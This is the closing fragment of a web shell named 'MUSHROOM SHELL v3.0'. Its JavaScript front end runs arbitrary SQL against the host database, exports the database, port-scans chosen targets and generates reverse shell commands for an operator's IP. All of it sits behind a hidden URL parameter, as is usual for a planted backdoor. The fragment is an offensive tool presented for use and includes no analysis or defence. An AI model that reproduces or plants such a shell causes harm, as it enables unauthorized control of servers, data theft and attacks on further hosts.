function dbQuery(){var sql=document.getElementById('sql-query').value;if(!sql){alert('SQL query required!');return;}var form=new FormData();form.append('sql_query',sql);var out=document.getElementById('sql-result');out.innerHTML='Running...';fetch('?<?=HIDDEN_PARAM?>=1&db=1&action=query',{method:'POST',body:form}).then(function(r){return r.text();}).then(function(data){out.innerHTML=data;showToast('Query executed!','info');}).catch(function(e){out.innerHTML='Error: '+e;});}
function dbExport(){window.location.href='?<?=HIDDEN_PARAM?>=1&db=1&action=export';showToast('Exporting...','info');}
function portScan(){var host=document.getElementById('scan-host').value.trim();var ports=document.getElementById('scan-ports').value.trim()||'22,80,443,3306';if(!host){alert('Target host required!');return;}var out=document.getElementById('scan-result');out.innerHTML='Scanning...';fetch('?<?=HIDDEN_PARAM?>=1&portscan=1&host='+encodeURIComponent(host)+'&ports='+encodeURIComponent(ports)).then(function(r){return r.text();}).then(function(data){out.innerHTML=data;showToast('Scan complete!','info');}).catch(function(e){out.innerHTML='Error: '+e;});}
function generateReverse(){var ip=document.getElementById('rev-ip').value.trim();var port=document.getElementById('rev-port').value.trim()||'4444';if(!ip){alert('Your IP required!');return;}var out=document.getElementById('rev-result');out.innerHTML='Generating...';fetch('?<?=HIDDEN_PARAM?>=1&reverseshell=1&ip='+encodeURIComponent(ip)+'&port='+encodeURIComponent(port)).then(function(r){return r.text();}).then(function(data){out.innerHTML=data;showToast('Commands generated!','success');}).catch(function(e){out.innerHTML='Error: '+e;});}
document.addEventListener('DOMContentLoaded',function(){showToast('MUSHROOM SHELL v3.0 loaded','info');});
</script>
</body>
</html>